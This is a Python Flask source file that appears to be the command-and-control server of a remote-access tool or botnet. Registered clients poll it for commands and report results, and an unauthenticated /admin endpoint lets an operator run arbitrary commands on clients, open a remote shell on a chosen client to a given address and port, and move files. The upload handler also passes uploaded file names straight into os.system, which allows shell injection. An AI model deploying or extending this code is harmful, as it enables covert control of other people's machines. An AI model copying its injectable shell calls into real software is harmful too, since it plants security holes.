#!/usr/bin/python3

from flask import Flask
from flask import request
from flask.helpers import send_from_directory
import requests, os

from myManager import manager,decodeJwt,encodeJwt
#from killableThread import thread_with_trace
#from myclient import client

import time
import logging

FOLDER="local"

###############################     ROUTES  ########################################
app = Flask(__name__)
master=manager()

#UID MUST BE PASSED TO PROVE REGISTRATION
def requireRegister():
    uid = request.headers.get('x-auth')
    uid,aproved = decodeJwt(uid)
    return uid["uid"],aproved


#response -> {x-auth:jwt,aproved: true}
@app.route('/register', methods=["GET"])
def register():
    uid,aproved=master.register(request.remote_addr)
    return {"x-auth":uid,"aproved":aproved},200

#example of return  list of unfinished tasks {taskuid1:cmd1,taskuid2:cmd2 ...} 
@app.route('/getcmd', methods=["POST"])
def getCmd():
    uid,aproved=requireRegister()
    if not aproved:
        return {"cmd":"NOP"},403
    command = master.getCmd(uid)
    if command!=None:
        return {"cmd":command},200
    else:
        return {"cmd":"NOP"},404

#report example {taskuid uid:aaaaa,report:"data"} }
#response {result:"OK"}
@app.route('/report', methods=["POST"])
def report():
    uid,aproved=requireRegister()
    if not aproved:
        return "Forbidden",403
    result=request.json["response"]
    master.report(result)
    return {'status':'ok'},200

@app.route('/clientOk', methods=["POST"])
def isOK():
    uid,aproved=requireRegister()
    master.clientList[uid].setOK=False
    return {'status':'ok'},200

@app.route('/admin', methods=["POST"])
def adminCmd():
    try:
        return parseJsonPOST_RPC(request.json,master)
    except Exception as e:
        print('---------------------------------')
        print("error in: " + str(e))

########################    HELPERS    #########################

@app.route("/sendFile2Server", methods=["POST"])
def sendFile2Server():
    print("RPC SendFile2Server ", request.files['lFile'].filename)
    request.files['lFile'].save(request.files['lFile'].filename)
    os.system("mv " + request.files['lFile'].filename + " " + FOLDER )
    return {'status':'recebido'},200

@app.route("/receiveFromServer", methods=["GET","POST"])
def receiveFromServer():
    cmd = request.json['sFile']
    return send_from_directory(directory=FOLDER, filename=cmd, as_attachment=True)


def parseJsonPOST_RPC(json,master):

    status_return=200
    if (json["CMD"]=="displayClients"):
        print("RPC DISPLAY",json)
        result=master.displayClients()

    elif (json["CMD"]=="abrirShell"):
        print("RPC abrirShell",json)
        result=master.abrirShell(json["uid"],json["addr"],json["port"])
        if (json["uid"] < len(master.clientList) and json["uid"] >= 0):
            status_return = 200
        else:
            status_return = 400
        
    elif(json["CMD"]=="runCommand"):
        print("RPC runCommand",json)
        result=master.runCommand(json["cmdString"],json["uid"])

    elif (json["CMD"]=="testServer"):
        print("RPC test server")
        result="server ok"

    elif (json["CMD"]=="testClient"):
        print("RPC test server", json)
        result=master.testClient(json["uid"])

    elif (json["CMD"]=="lisFileServer"):
        os.system("ls " + FOLDER +  " 1>>a.txt")
        a = open("a.txt")
        returnList = []
        for line in a:
            returnList.append(line)
        a.close()
        os.system("rm a.txt")
        result= returnList

    else:
        return {"status":"unkown"},401
    
    return {"status":result},status_return


app.run("0.0.0.0",port=8080, use_reloader=False)


